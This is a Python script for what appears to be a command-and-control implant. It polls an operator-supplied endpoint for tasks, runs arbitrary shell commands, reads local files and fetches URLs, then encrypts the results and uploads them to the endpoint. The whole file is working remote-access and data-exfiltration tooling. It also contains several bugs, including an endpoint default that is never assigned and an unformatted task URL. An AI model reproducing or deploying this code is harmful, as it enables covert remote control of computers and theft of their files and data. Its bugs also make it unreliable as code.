import argparse
import os
import time
import requests
import platform
import subprocess

from ecrypt import Ecrypt


def is_valid_http_method(method):
    """Function to check if a given HTTP method is valid"""
    valid_methods = ['POST', 'GET', 'PUT', 'DELETE']
    return method.upper() in valid_methods


def main(endpoint_url):
    """Main function"""
    if not endpoint_url:
        endpoint_url == "http://127.0.0.1:8433"

    # Send a request to the endpoint to retrieve public key and client ID
    response = requests.get(endpoint_url + "/hello")
    if response.status_code == 200:
        resp = response.json()
        ec = Ecrypt(public_key=resp.get("pubkey"))
        cid = resp.get("cid")

        # Continuously check for commands from the endpoint
        while True:
            try:
                response = requests.get(endpoint_url+"/list/{cid}")
                data = response.json()
                command = data.get('command')
                if command:
                    command_type = data.get('type')
                    method = data.get('method')
                    headers = data.get('headers')
                    body = data.get('body')
                    id = data.get('id')

                    if command_type.startswith('dl'):
                        download_file(cid,id,ec, command, method, headers, body)
                    if command_type.startswith('filedl'):
                        download_file(cid,id,ec, command)
                    if command_type == 'cmd':
                        execute_command(cid,id,ec, command)

            except Exception as e:
                send_error(cid, id,f"Error during command execution: {e}")
            time.sleep(2)


def execute_command(cid,id,ec, command):
    """Function to execute a command"""
    try:
        if platform.system() == 'Windows':
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, text=True)
        else:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, text=True, executable="/bin/bash")

        payload = {'output': ec.encrypt_content(output), "id": id, "cid": cid}
        response = requests.post(endpoint_url + "/command", json=payload)
        if response.status_code != 200:
            send_error(cid,id, "Failed to send the result to the endpoint.")
    except subprocess.CalledProcessError as e:
        send_error(cid,id, f"Error during command execution: {e.output}")
    except Exception as e:
        send_error(cid,id, f"Error during command execution: {e}")


def send_file(cid,id, file, name):
    """Function to send a file to the endpoint"""
    if not name:
        name = file.name
    upload_response = requests.post(
        endpoint_url + "/upload", data={"id": id, "cid": cid, "name": name}, files={"file": file})
    if upload_response.status_code != 200:
        send_error(id, "Failed to send the file.")


def send_error(cid, id, msg):
    """Function to send an error message to the endpoint"""
    requests.post(endpoint_url + "/error",
                          data={"id": id, "cid": cid, "ret": msg})


def download_file(cid, id,ec, file_url, method=None, headers=None, body=None):
    """Function to download a file from the given URL"""
    try:
        if method:
            response = requests.request(
                method.lower(), file_url, headers=headers, data=body)
            if response.status_code == 200:
                send_file(cid, id, ec.encrypt_file_content(response.content), None)
        else:
            if os.path.exists(file_url):
                with open(file_url, "rb") as file:
                    send_file(cid, id, ec.encrypt_file(file), file.name)
    except Exception as e:
        send_error(cid, id, print("Error performing the HTTP request:", e))


if __name__ == "__main__":
    """Command-line argument parser"""
    parser = argparse.ArgumentParser(
        description="Script to perform specific tasks based on commands from an endpoint.")
    parser.add_argument('--endpoint_url', required=True,
                        help='The URL of the endpoint.')
    args = parser.parse_args()
    endpoint_url = args.endpoint_url
    main(endpoint_url)
